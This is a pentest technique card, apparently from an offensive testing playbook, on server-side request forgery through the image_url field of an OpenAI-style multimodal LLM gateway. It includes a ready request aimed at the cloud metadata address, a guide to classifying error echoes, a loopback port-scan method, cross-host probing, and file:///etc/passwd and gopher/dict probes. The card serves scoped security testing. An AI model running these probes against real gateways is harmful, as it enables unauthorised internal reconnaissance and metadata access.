# 1. SSRF via `image_url` media-fetch → internal HTTP/port/connect ORACLE (zero token burn) — firmware / high-priv

- source canon: `holyshit-mode/llm-gateway-ssrf-oracle-and-drain-calibration.md`
- base technique: `holyshit-mode-llm-gateway-ssrf-oracle-and-drain-calibration-.md`
- bindings: **WSTG-SESS** · **CWE-287** · **ATT&CK T1528**
- context: **firmware** · auth **high-priv** · chain role **pivot**

## Route

- probes: `nmap-slowloris-check`, `curl`
- chains: `web`
- gate: every probe runs through the shared scope authority (rc=1 out of estate); the 3-gate differential turns output into a finding

## Context

- platform: the check lives in the image — uart/flash/ota paths, no-gain read-only dumps
- auth state: the baseline IS the privileged session; test downgrade paths (mass-assign, state-bypass)

## The technique

A vLLM/OpenAI-style endpoint accepting an `image_url` (multimodal) content part performs a
**server-side URL fetch**, and the error message **echoes the fetch result**:

```
POST https://<internal-gateway>/invocations
{"model":"deepseek-v4-flash",
 "messages":[{"role":"user","content":[{"type":"image_url","image_url":{"url":"http://169.254.169.254/latest/meta-data/"}}]}]}
→ 422 {"error":{"message":"Failed to fetch media from URL: HTTP 404 error (...)"}}
```

Discrimination matrix (all from the error echo; **do NOT let it generate a completion** — read the
media-fetch error):
- `HTTP 404 error` → reachable, answering with status 404.
- `cannot identify image file` ("Failed to load image") → **got a real HTTP 2xx BODY** (loopback-only
  route serving content that isn't an image).
- `Cannot connect to host <h>:<p> [Connect call failed]` → closed/filtered; a TLS listener answers the
  plain-HTTP probe with `ssl:default` connect errors.
- Timeout/hang → host resolves but connect blocked (non-loopback/down).
- **Port-scan:** iterate `http://127.0.0.1:<port>/` and classify. Cheap.
- **Cross-fleet test:** `http://api.<target>/`, `http://gateway.<target>/v1/` often echo real statuses →
  the SSRF reaches OTHER internal hosts, not just loopback. Probe host 80/443 even if a specific port hung.

**Exotic-protocol ceiling (run once, they're free + definitive for the RCE question):**
- `file:///etc/passwd` → `Cannot load local files without --allowed-local-media-path` = **local-file
  read disabled** (no OOB file-read/RCE; log as mitigation, stop probing that path).
- `gopher://` / `dict://` → rejected ("URL must be HTTP, data or file URL") = no protocol smuggling.
- `http://[::1]:<port>` → connect-fail = IPv6 loopback separate/closed.

SSRF **exfil limit (verified):** text-body-read-through-vision does NOT work — a non-image response
errors `cannot identify image file` before any vision/OCR flows. The oracle is status/connect-only
unless the internal target serves an actual image. So this is internal-reach + recon, not a data dump.

## Probe adjustment (firmware × high-priv)

1. baseline first: the request/session with NOTHING changed
2. attack: the documented class probe, adjusted per context above
3. diff: measurable only — status/length/body — or it is not a finding

## Chain roles

- combines with a prior finding — chain detect pairs same-origin findings
- pairs-with: see `skilltree-index.md` for the sibling techniques

## Walls

- validation-only · NO-GAIN · documented-class adaptation only
- in-scope only: the scope authority refuses everything else (rc=1)
